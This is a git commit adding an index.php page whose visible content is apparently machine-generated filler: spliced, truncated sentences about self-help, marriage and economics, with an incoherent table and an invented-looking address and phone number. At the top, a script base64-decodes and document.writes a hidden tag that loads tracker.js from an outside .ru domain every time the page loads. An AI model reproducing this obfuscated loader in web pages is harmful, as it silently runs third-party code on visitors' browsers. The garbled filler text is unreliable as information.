ba684ed148f49d9fbf49eb07fa580c8aecd2fe6c
isturtit <80781156+isturtit@users.noreply.github.com>
2021-03-16 19:35:35 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9xMGRpd3FqYjl4a281amVqbzUiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>- to my proactive literary agent Ian Miller, my colleague Greg Link, for whom nothing</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="lgib6glwpbbt366">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="2kzxjz7ijhs5d0i9n9lx8">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>- to my proactive literary agent Ian Miller, my colleague Greg Link, for whom nothing</h1>
+	</section>
+
+
+	<section class="our-work" class="ii81f81m754dtb9bi1c5goy">
+		<h3 class="title">By placing timeless and changeless principles at th</h3>
+		<p>This action probably required a higher emotional maturity than the level of patience and internal control that I possessed at the time.  This category constitutes the so-called frictional unemployment.  Accordingly, cyclical unemployment arises.It is not possible to eliminate this type of unemployment, since the cyclical nature of economic growth cannot be canceled.  In this regard, it should be noted that the category of “full employment” is unacceptable for a market economy, including for quite “natural” reasons.  Wisdom and power are spent in counter-dependent negative interactions.  The third speaker is a co-worker, your professional colleague.  The degree of mastery of this technique - the tip of the iceberg called empathic listening - is characterized by four successive stages.  Even though you have taken the time to achieve 19 important goals within one week, see how much free space is left on your schedule! Along with the urge to do what needs to be done first, the weekly planning method gives you freedom and flexibility.to cope with unforeseen circumstances, to move, if necessary, planned activities, to get satisfaction from relationships and interactions with other people, to enjoy life in all its spontaneous manifestations, knowing that you have proactively organized your week to achieve key goals in all areas own life.  Several times I had to take part in negotiations between people who were angry with each other, hiring lawyers to defend their positions.  We are responsible for our effectiveness, for our own happiness and, ultimately, for most of the circumstances in our lives. </p>
+		<hr>
+
+		<ul class="grid" class="gpafgyg9qshvog88">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="ii81f81m754dtb9bi1c5goy">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>It showed racehorses rushing to the finish line, with photographs of the faces of the local managers attached to their faces.  Then he </td>
+    <td>And this tool is most suitable for such a reality, which is our life - a phenomenon not only logical, but also emotional.  Fo</td>
+    <td>The monopoly price structure is expressed by the formula:Rmon.  Reactive Model How accurately and functionally do these deterministic maps des</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>Our relationship is very dear to me, and I want to understand you.  And to get these eggs regularly, we must take care of the goose.  The President tri</td>
+    <td>In modern conditions, the natural unemployment rate is 5.5-6.5%.  One of the most important areas of my work with organizations is helping to develo</td>
+    <td>This is the highest PC-level work that has a significant impact on the effectiveness of every aspect of our lives.  The formulation o</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Reactive people transformed it into feeling.  Agreements Relationships generate agreements that define and guide the Win </td>
+    <td>Seek God's help and be worthy of it.  Given the serious technological lag of the Russian economy in most positions, Russia needs for</td>
+    <td>For example, a customer can buy a pack of cigarettes for 1.5 rubles.  Even under the harshest and roughest shell, tender feelings and a sensitive heart are hidden.</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="lgib6glwpbbt366">
+		<h3 class="title">Depending on the unit of accounting for ho</h3>
+		<p>This paradigm is just as powerful in business.  But we have very good plans to improve management, reduce costs and increase our market share.  Win / Lose people love Lose / Win people because they can live off of them.  People who exist on a similar level do not live, they vegetate or, so to speak, are exposed to life.  However, it is common to all markets that the amount of resources offered for sale is limited in comparison with the needs for their production.For a manufacturing enterprise, prices on the market are of great importance.  I remember how I literally shivered at the thought of the upcoming conversation.He was known as a person with a very strong character, a person stubborn, persistent and confident in his righteousness.  Christ removes poverty from people so that they themselves can lift themselves out of poverty.  If I don't learn the correct principles of human interaction, I may not even know that I need to listen to others.  But the school allowed such marks, and about this no one, except the duck itself, was worried.  Consequences determine what happens - good or bad - as a result of the assessment.  And I wanted to shout to the whole world: “I am free! I broke free from captivity! I will never again allow other people's attitude to me to rule my life. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="2kzxjz7ijhs5d0i9n9lx8" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ii81f81m754dtb9bi1c5goy">
+		<h3 class="title">It includes mutual learning, mutual influence and mutual benefi</h3>
+		<p>2.  If, instead of truly understanding the meaning of what the author said, we rely on our own autobiography and make hasty judgments,we thereby limit the benefits that we could get from reading.  They focus on the weaknesses of other people, on environmental problems and circumstances that they cannot influence.  Ideally, these short-term goals should be linked to the longer-term goals that you set in accordance with your personal mission.  When my son Joshua was very young, he constantly asked me the same soul-turning question. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="gpafgyg9qshvog88" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="gpafgyg9qshvog88" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="lgib6glwpbbt366">
+		<h3 class="title">boredom.  But over time, if you are honest, open an</h3>
+		<p>A manufacturer, having invested an hour of his efforts, can produce a unit of result.  " There are successive stages of growth and development in every life.  - What did you like the most? - I do not know.  Commodity a is in the relative form of value. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="2kzxjz7ijhs5d0i9n9lx8" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ii81f81m754dtb9bi1c5goy">
+		<h3 class="title">Negative feelings spilled over.  - Educati</h3>
+		<p>It leaves the choice of method to people and makes them accountable for the results.  They lose the sense of proportion and balance needed to live effectively.  As we study these skills, we will see how they interact with each other to create effective interdependence.  In accordance with this decree, the husband sold a car worth 10 thousand dollars for 50 dollars, of which 25 he gave to his wife.  Various options for the intensity of such changes can also be attributed to one of three main cases: 1) elastic supply; 2) inelastic offer; 3) the offer of unit elasticity.  And if suddenly her mother's condition deteriorates and she dies, the husband can never forgive himself for this, just as the wife cannot forgive her husband for this.  Short-term is the time interval during which it is impossible to change the size of the manufacturing enterprise owned by the firm, i.e.the amount of fixed costs incurred by this firm.  Entrepreneurs seek to discover income opportunities that competitors have missed.  But deep down, something gnaws at me.  I've seen unhappy marriagesin which each of the spouses expected changes from the other, in which each listed the other's “sins”, in which each tried to remake the other.  This is why Habits 1, 2, and 3 in the following chapters focus on self-mastery.  The measurement of the monetary value of air is zero, and at the same time life itself is impossible without it. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="gpafgyg9qshvog88" class="title">Is it logical that two people who disagree on the same issue ar</h3>	
+		<p>Principles are deep, fundamental, classical truths, common denominators.  Just listen and try to understand.  In my opinion, for this to work in the best possible way,you need to organize your life on the basis of weekly planning.  If two people who are married are more concerned about getting the golden eggs for themselves than about maintaining those relationships that make this possible, they often become insensitive and inattentive, neglect the acts of kindness and signs of attention that are so necessary to create deep relationships.  And that I loved him as perhaps no one else in the world.  And the key to appreciating differences lies in realizing that all people see the world not as it is, but as they are.  The irritation was gone.  But one of the leaders was proactive.He was guided by values, not feelings.  Listen to them; understand them. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="lgib6glwpbbt366">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="2kzxjz7ijhs5d0i9n9lx8"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ii81f81m754dtb9bi1c5goy"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="gpafgyg9qshvog88"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>0219 Eldred Spring, Apt. 600, 97049, Natashatown, Alaska, United States</p>
+		<p>Phone number: +77(0237)112-82248</p>
+	</footer>
+
+</body>
+
+</html>
